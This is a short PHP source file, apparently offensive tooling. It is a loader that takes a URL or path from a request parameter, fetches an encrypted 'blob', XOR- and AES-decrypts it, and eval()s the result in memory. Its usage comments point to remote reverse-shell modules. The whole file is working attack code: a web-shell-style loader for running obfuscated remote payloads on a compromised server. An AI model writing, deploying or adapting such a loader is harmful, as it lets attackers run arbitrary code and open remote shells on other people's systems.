<?php
// MINC - PHP Loader for Encrypted Memory Modules (blob.json compatible)

function xor_decrypt($data, $key) {
    $out = '';
    $len = strlen($key);
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ $key[$i % $len];
    }
    return $out;
}

function fernet_decrypt($encrypted_b64, $key_b64) {
    $key = base64_decode($key_b64);
    $ciphertext = base64_decode($encrypted_b64);
    $iv = substr($ciphertext, 0, 16);
    $hmac = substr($ciphertext, -32);
    $ciphertext_raw = substr($ciphertext, 16, -32);
    $calc_hmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
    if (!hash_equals($hmac, $calc_hmac)) {
        return false;
    }
    return openssl_decrypt($ciphertext_raw, 'aes-128-cbc', $key, OPENSSL_RAW_DATA, $iv);
}

function load_blob($path_or_url) {
    if (strpos($path_or_url, 'http') === 0) {
        return json_decode(file_get_contents($path_or_url), true);
    } elseif (file_exists($path_or_url)) {
        return json_decode(file_get_contents($path_or_url), true);
    }
    return null;
}

// === Usage ===
// php_loader.php?blob=http://cdn.com/modules/shell123_reverse_shell.blob.json
// OR:
// php_loader.php?blob=output/modules/reverse_shell.blob.json

if (isset($_GET['blob'])) {
    $blob = load_blob($_GET['blob']);
    if (!$blob) {
        echo "[php_loader] Failed to load blob.\n";
        exit;
    }

    $payload = base64_decode($blob['payload']);
    if (!empty($blob['xor'])) {
        $xor_key = base64_decode($blob['xor']);
        $payload = xor_decrypt($payload, $xor_key);
    }

    $decrypted = fernet_decrypt(base64_encode($payload), $blob['key']);
    if (!$decrypted) {
        echo "[php_loader] Decryption failed.\n";
        exit;
    }

    echo "[php_loader] Executing memory payload (" . $blob['type'] . ")...\n";
    eval("?>" . $decrypted);  // memory execute
    exit;
}

echo "[php_loader] Usage: ?blob=http://cdn/uid.blob.json";
?>

